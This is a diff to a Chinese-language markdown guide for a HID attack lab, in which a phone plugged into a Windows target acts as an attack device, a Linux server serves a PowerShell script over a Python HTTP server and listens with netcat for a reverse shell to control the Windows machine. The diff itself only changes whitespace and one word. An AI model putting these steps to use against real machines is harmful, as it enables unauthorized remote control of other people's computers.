@@ -1,10 +1,11 @@
 ### 指南
+
 一台电脑,一台手机,termius连接一台linux服务器
 手机负责执行hid attack攻击
 linux服务器,用来接收shell(即控制window)
 window,用来当靶机,手机插上去且屏幕打开就行
 ### 步骤
-- 攻击机执行`cd /opt/shell;sudo python3 -m http.server 82 &` 用于开启python服务器来访问ps脚本![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230914220718.png)
+- 攻击机执行`cd /opt/shell;sudo python3 -m http.server 82 &` 用于开启python http服务器来访问ps脚本![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230914220718.png)
 - 手机连接到电脑usb接口上,作为一个hid attack攻击设备
 - linux监听本地端口,在命令行输入`sudo nc -lvnp 80`![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230912235031.png)
 *监听成功标志*
